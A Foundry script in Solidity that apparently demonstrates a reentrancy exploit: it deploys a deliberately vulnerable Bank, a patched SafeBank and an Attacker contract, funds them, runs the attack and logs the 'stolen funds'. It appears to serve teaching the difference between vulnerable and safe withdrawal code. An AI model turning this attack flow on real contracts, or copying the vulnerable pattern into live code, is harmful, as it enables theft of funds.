// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/Bank.sol";
import "../src/SafeBank.sol";
import "../src/Attacker.sol";

contract DeployReentrancy is Script {
    function run() external payable {
        vm.startBroadcast();

        // 1) Deploy vulnerable Bank
        Bank vulnerable = new Bank();
        console.log("Bank (vulnerable) deployed at:", address(vulnerable));

        // 2) Deploy SafeBank
        SafeBank safe = new SafeBank();
        console.log("SafeBank deployed at:", address(safe));

        // 3) Fund both banks with small amounts matching your available balance
        // Adjust these amounts if you top up the wallet
        uint256 fundVulnerable = 0.015 ether;
        uint256 fundSafe = 0.015 ether;

        // deposit to vulnerable (addBalance is payable)
        vulnerable.addBalance{value: fundVulnerable}();
        console.log("Funded vulnerable bank with:", fundVulnerable);
        console.log("Vulnerable bank balance now:", address(vulnerable).balance);

        // deposit to safebank
        safe.addBalance{value: fundSafe}();
        console.log("Funded SafeBank with:", fundSafe);
        console.log("SafeBank balance now:", address(safe).balance);

        // 4) Deploy Attacker pointing at vulnerable bank
        Attacker attacker = new Attacker(address(vulnerable));
        console.log("Attacker deployed at:", address(attacker));

        // 5) Run the attack with a seed amount that matches the patched attacker
        uint256 seed = 0.01 ether;
        console.log("Calling attacker.attack() with seed:", seed);

        // attack() will deposit seed into vulnerable as attacker and then call withdraw -> reentrancy
        attacker.attack{value: seed}();
        console.log("Attack complete.");

        // 6) Report balances after the attack
        console.log("Vulnerable bank balance after attack:", address(vulnerable).balance);
        console.log("SafeBank balance (should be unchanged):", address(safe).balance);
        console.log("Attacker contract balance (stolen funds):", address(attacker).balance);

        vm.stopBroadcast();
    }
}
